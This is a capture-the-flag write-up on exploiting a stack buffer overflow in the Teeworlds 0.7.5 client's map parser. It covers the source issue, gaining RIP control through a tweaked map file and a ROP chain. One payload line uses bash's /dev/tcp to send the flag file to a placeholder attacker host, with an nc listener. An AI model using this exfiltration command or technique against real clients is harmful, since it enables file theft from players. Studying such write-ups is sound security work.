# Teewars&emsp;<sub><sup>Clone-and-Pwn, 378 points</sup></sub>

_Writeup by [@bluepichu](https://github.com/bluepichu) and [@f0xtr0t](https://github.com/jaybosamiya)_

> Let's have some fun with Teeworlds! Not play it but pwn it!

The [download for this problem](./TeeWars_d9ca7fdb4fa0225315ba4407c1b83896.tar.gz) contained a Dockerfile that pulls [Teeworlds](https://github.com/teeworlds/teeworlds) and runs the client pointed at an IP address of our choosing (the other two files were a small runner, and a pre-built copy of the executable).  Note that it disables multiple, so it shouldn't be too hard to pwn it with instruction-pointer control:

```
$ checksec teeworlds
[*] '/pwn/teewars/teeworlds'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'/usr/local/lib:'
```

Since this is an open-source project on GitHub, the first thing we did was search for issues and pull requests that mentioned security issues.  Searching for "overflow" turned up [this issue](https://github.com/teeworlds/teeworlds/issues/2981) that mentioned a stack buffer overflow in the map parser.  Although [a PR to fix it](https://github.com/teeworlds/teeworlds/pull/3018) had already been merged, we noticed that it was merged in February 2022, well after the release used by the problem (from April 2020).  This made it a very good candidate to attack, and a quick test with the map file from the issue segfaulted the client and confirmed it was still vulnerable.

Although the original reporter [had a full exploit chain](https://mmmds.pl/fuzzing-map-parser-part-1-teeworlds/#exploit) for this bug, it didn't seem to be published anywhere, so it was up to us to reproduce it.  The POC posted with the issue unhelpfully segfaulted the client by attempting to write beyond the stack, so the first step was to figure out how to make overwrite part of the stack without crashing by modifying the POC map.

The only documentation we could find on the map format was [from the docs of a Python library made for parsing it](https://sushitee.github.io/tml/mapformat.html), but that ultimately gave us enough information to manually walk through the format.  We knew that the bug was a bad bounds check in [this loop](https://github.com/teeworlds/teeworlds/blob/0.7.5/src/game/client/components/maplayers.cpp#L257), so we needed to look for somewhere in the map where the number of envpoints on an item was set to a large number, and set it to something smaller.  Checking the diff of the POC map with `ctf1.map`, which it was based on, only had a few results, only one of which looked like a numeric change; turning down the number of envpoints made us start segfaulting at a different RIP, meaning that we were successfully overwriting the return address!  A little bit of experimentation later, and we had full control over RIP!

Since this is a stack-based overflow, which copies in essentially everything we provide onto the stack, but NX is enabled, naturally we decide to write a ROP chain. Our ROP chain sets up an `execve("/bin/bash", {'/bin/bash', '-c', 'cat</home/rwctf/flag>/dev/tcp/XXX.XXX.XXX.XXX/YYYYY'}, NULL)` syscall and executes it. This payload uses bash's built-in `/dev/tcp/<IPADDRESS>/<PORT>` to send the flag over TCP to our server (at XXX.XXX.XXXX.XXXX which is running `nc -l -p YYYYY`). To set up the space necessary for the array of strings, and the array of pointers to the strings, we just picked an arbitrary point in the process's memory (since there is no PIE on this binary, we can just pick an arbitrary read/write region without needing to worry about things), and there were plenty of useful gadgets all across the binary to choose from. Our ropchain generator can be found in [ropchain.py](./ropchain.py), whose output we plugged directly into the version of the map where we had got control over RIP.

Our final exploit map is in [pwn.map](./pwn.map), and we set up the server to serve it using the configuration in [docker-compose.yml](./docker-compose.yml).
